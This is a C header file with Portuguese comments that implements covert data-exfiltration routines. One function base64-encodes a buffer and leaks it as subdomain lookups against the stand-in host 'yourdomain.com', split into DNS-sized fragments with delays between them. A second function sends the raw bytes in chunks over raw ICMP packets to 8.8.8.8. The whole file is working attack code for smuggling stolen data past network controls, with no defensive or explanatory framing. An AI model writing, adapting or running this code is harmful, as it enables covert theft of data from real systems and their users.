#ifndef NETWORK_H
#define NETWORK_H

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    #define close closesocket
    #define usleep(x) Sleep((x)/1000)
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif

// Exfiltração via DNS real
static inline void exfiltrate_dns_real(uint8_t* data, uint32_t size) {
    if (!data || size == 0 || size > 4096) return;
    
    char encoded[1024] = {0};
    const char* b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    // Base64 encode
    int j = 0;
    for (uint32_t i = 0; i < size && j < 1000; i += 3) {
        uint32_t a = i < size ? data[i] : 0;
        uint32_t b = i + 1 < size ? data[i + 1] : 0;
        uint32_t c = i + 2 < size ? data[i + 2] : 0;
        
        uint32_t triple = (a << 16) + (b << 8) + c;
        
        encoded[j++] = b64[(triple >> 18) & 0x3F];
        encoded[j++] = b64[(triple >> 12) & 0x3F];
        encoded[j++] = b64[(triple >> 6) & 0x3F];
        encoded[j++] = b64[triple & 0x3F];
    }
    
    // Fragmentar e enviar
    for (int i = 0; i < j; i += 50) {
        char fragment[64] = {0};
        strncpy(fragment, encoded + i, 50);
        
        char query[128];
        snprintf(query, sizeof(query), "%s.yourdomain.com", fragment);
        
        // Resolver DNS (exfiltra dados)
        struct hostent* host = gethostbyname(query);
        usleep(200000); // 200ms delay
    }
}

// Exfiltração via ICMP
static inline void exfiltrate_icmp_real(uint8_t* data, uint32_t size) {
    if (!data || size == 0 || size > 4096) return;
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) return;
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
    
    // Enviar dados em chunks ICMP
    for (uint32_t i = 0; i < size; i += 32) {
        uint32_t chunk_size = (size - i > 32) ? 32 : size - i;
        sendto(sock, data + i, chunk_size, 0, (struct sockaddr*)&addr, sizeof(addr));
        usleep(100000);
    }
    
    close(sock);
}

#endif